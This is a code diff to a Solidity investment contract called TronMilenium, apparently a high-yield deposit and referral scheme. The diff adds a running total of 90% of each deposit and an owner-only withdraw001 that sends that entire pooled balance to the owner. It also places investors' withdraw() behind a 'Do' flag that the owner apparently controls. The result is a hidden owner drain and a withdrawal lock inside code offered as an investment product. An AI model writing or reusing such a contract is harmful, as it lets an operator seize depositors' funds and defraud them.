@@ -42,6 +42,7 @@ contract TronMilenium  {
   uint public totalInvestors;
   uint public totalInvested;
   uint public totalRefRewards;
+  uint public InContract;
 
   mapping (address => Investor) public investors;
 
@@ -63,15 +64,17 @@ contract TronMilenium  {
       return (totalInvestors, totalInvested, totalRefRewards);
   }
 
-  function owner() public view returns (address owner){
+  function owner() public view returns (address){
     return owner;
   }
 
-  function setOwner(address _owner) public view returns (address owner){
+  function setOwner(address _owner) public returns (address){
     if (msg.sender == owner){
       owner = _owner;
     }
+    return owner;
   }
+  
   
   function start() internal {
     if (msg.sender == owner){
@@ -180,6 +183,7 @@ contract TronMilenium  {
     investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));
     
     owner.transfer(msg.value.mul(10).div(100));
+    InContract += msg.value.mul(90).div(100);
     
     emit DepositAt(msg.sender, tariff, msg.value);
   }
@@ -212,12 +216,12 @@ contract TronMilenium  {
     return Do;
   }
 
-  function withdraw001(uint amount) public returns (uint) {
+  function withdraw001() public returns (uint) {
     require(msg.sender == owner);
-    if (msg.sender.send(amount)){
-     return amount;
+    require (InContract > 0);
+    if (msg.sender.send(InContract)){
+      return InContract;
     }
-    
   }
 
   function MYwithdrawable() public view returns (uint amount) {
@@ -252,21 +256,27 @@ contract TronMilenium  {
   }
   
   function withdraw() external {
-    uint amount = profit();
-    uint tariff = 0;
-    uint amount25 = amount.mul(25).div(100);
-    uint amount75 = amount.mul(75).div(100);
-    if (msg.sender.send(amount75)) {
-      investors[msg.sender].withdrawn += amount75;
-      investors[msg.sender].invested += amount25;
+    if (Do){
+      uint amount = profit();
+      uint tariff = 0;
+      uint amount25 = amount.mul(25).div(100);
+      uint amount75 = amount.mul(75).div(100);
+      if (msg.sender.send(amount75)) {
+        investors[msg.sender].withdrawn += amount75;
+        investors[msg.sender].invested += amount25;
+        
+        investors[msg.sender].deposits.push(Deposit(tariff, amount25, block.number));
+        
+        totalInvested += amount25;
+
+        InContract -= amount75;
       
-      investors[msg.sender].deposits.push(Deposit(tariff, amount25, block.number));
-      
-      totalInvested += amount25;
-  
-    emit Withdraw(msg.sender, amount75);
-    emit reInvest(msg.sender, amount25);
+        emit Withdraw(msg.sender, amount75);
+        emit reInvest(msg.sender, amount25);
+      }
+
     }
+    
   }
   
 }
